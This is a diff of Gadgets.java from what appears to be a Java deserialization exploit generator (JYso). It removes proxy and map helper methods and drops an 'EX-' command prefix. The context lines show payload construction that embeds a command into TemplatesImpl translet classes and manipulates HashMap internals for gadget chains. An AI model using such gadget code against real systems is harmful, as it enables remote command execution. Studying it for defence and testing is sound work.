@@ -1,6 +1,5 @@
 package com.qi4l.JYso.gadgets.utils;
 
-import com.qi4l.JYso.gadgets.JDKUtil;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
@@ -14,7 +13,6 @@ import java.util.HashMap;
 import java.util.Map;
 
 import static com.qi4l.JYso.gadgets.Config.Config.*;
-import static com.qi4l.JYso.gadgets.JDKUtil.createProxy;
 import static com.qi4l.JYso.gadgets.utils.Utils.saveCtClassToFile;
 import static com.qi4l.JYso.gadgets.utils.handle.ClassFieldHandler.insertField;
 import static com.qi4l.JYso.gadgets.utils.handle.ClassMethodHandler.insertCMD;
@@ -47,18 +45,9 @@ public class Gadgets extends ClassLoader {
         }
     }
 
-    public static <T> T createMemoitizedProxy(final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces) throws Exception {
-        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
-    }
-
 
     public static InvocationHandler createMemoizedInvocationHandler(final Map<String, Object> map) throws Exception {
         return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
-    }
-
-
-    public static Map<String, Object> createMap(final String key, final Object val) {
-        return JDKUtil.createMap(key, val);
     }
 
     public static Object createTemplatesImpl(String command) throws Exception {
@@ -79,7 +68,7 @@ public class Gadgets extends ClassLoader {
         POOL.get(ABST_TRANSLET.getName());
 
         // 扩展功能
-        if (command.startsWith("EX-") || command.startsWith("LF-")) {
+        if (command.startsWith("LF-")) {
             ctClass = generateClass(command, newClassName);
         } else {
             // 普通的命令执行
@@ -156,7 +145,7 @@ public class Gadgets extends ClassLoader {
         POOL.get(ABST_TRANSLET.getName());
 
         // 扩展功能
-        if (command.startsWith("EX-") || command.startsWith("LF-")) {
+        if (command.startsWith("LF-")) {
             ctClass = generateClass(command, newClassName);
         } else {
             // 普通的命令执行
@@ -229,7 +218,7 @@ public class Gadgets extends ClassLoader {
         POOL.get(ABST_TRANSLET.getName());
 
         // 扩展功能
-        if (command.startsWith("EX-") || command.startsWith("LF-")) {
+        if (command.startsWith("LF-")) {
             ctClass = generateClass(command, newClassName);
         } else {
             // 普通的命令执行
@@ -293,9 +282,5 @@ public class Gadgets extends ClassLoader {
         Array.set(arr, 1, node2);
         Reflections.setFieldValue(hashMap, "table", arr);
         return hashMap;
-    }
-
-    public Class<?> defineClass(String name, byte[] bytecode) {
-        return defineClass(name, bytecode, 0, bytecode.length);
     }
 }
